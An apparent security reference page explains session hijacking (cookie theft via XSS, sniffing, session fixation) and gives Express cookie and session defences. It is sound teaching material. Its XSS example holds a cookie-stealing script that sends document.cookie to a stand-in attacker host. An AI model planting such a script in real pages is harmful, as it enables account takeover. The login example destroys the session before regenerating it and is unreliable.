# Session Hijacking Attack

## 📋 Attack Information
**Category**: Authentication Attack | **Severity**: 🔴 High (CVSS 7.5)

## 🎯 Attack Principle
Attacker steals user's session token to impersonate them without knowing password.

## 💀 Attack Vectors

### 1. XSS Steals Cookie
```javascript
// XSS payload
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Attacker gets: session_id=abc123
// Uses it to impersonate user
```

### 2. Network Sniffing
```
User on public WiFi
→ Session cookie transmitted without HTTPS
→ Attacker sniffs network traffic
→ Captures session cookie
→ Impersonates user
```

### 3. Session Fixation
```
Attacker sets victim's session ID
→ Victim logs in (session ID doesn't change)
→ Attacker uses same session ID
→ Logged in as victim
```

## 🛡️ Defense Measures

### 1. HTTP-Only Cookies
```typescript
// ✅ Session cookie inaccessible to JavaScript
res.cookie('session_id', sessionId, {
  httpOnly: true,  // Cannot be read by document.cookie
  secure: true,    // HTTPS only
  sameSite: 'strict',
  maxAge: 3600000, // 1 hour
});
```

### 2. Secure & SameSite
```typescript
// ✅ Comprehensive cookie security
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    secure: true,       // HTTPS only
    httpOnly: true,     // No JavaScript access
    sameSite: 'strict', // No cross-site requests
    maxAge: 3600000,    // 1 hour expiry
  },
  resave: false,
  saveUninitialized: false,
}));
```

### 3. Regenerate Session on Login
```typescript
// ✅ New session ID after login
app.post('/api/login', async (req, res) => {
  const user = await authenticate(req.body);
  
  if (user) {
    // Destroy old session
    req.session.destroy();
    
    // Create new session
    req.session.regenerate((err) => {
      req.session.userId = user.id;
      res.json({ success: true });
    });
  }
});
```

### 4. Session Binding
```typescript
// ✅ Bind session to IP and User-Agent
app.use((req, res, next) => {
  if (req.session.userId) {
    const fingerprint = {
      ip: req.ip,
      userAgent: req.headers['user-agent'],
    };
    
    if (req.session.fingerprint) {
      if (req.session.fingerprint.ip !== fingerprint.ip ||
          req.session.fingerprint.userAgent !== fingerprint.userAgent) {
        // Fingerprint mismatch
        req.session.destroy();
        return res.status(401).json({ error: 'Session invalid' });
      }
    } else {
      req.session.fingerprint = fingerprint;
    }
  }
  
  next();
});
```

### 5. Session Timeout
```typescript
// ✅ Auto-logout after inactivity
const SESSION_TIMEOUT = 15 * 60 * 1000; // 15 minutes

app.use((req, res, next) => {
  if (req.session.userId) {
    const now = Date.now();
    const lastActivity = req.session.lastActivity || now;
    
    if (now - lastActivity > SESSION_TIMEOUT) {
      req.session.destroy();
      return res.status(401).json({ error: 'Session expired' });
    }
    
    req.session.lastActivity = now;
  }
  
  next();
});
```

## ✅ Best Practices

```
□ Use HTTP-only cookies
□ Enable Secure flag (HTTPS only)
□ Set SameSite=Strict
□ Regenerate session on login
□ Implement session timeout
□ Bind session to device fingerprint
□ Use short session lifetimes
□ Clear session on logout
```

**Created**: November 11, 2025

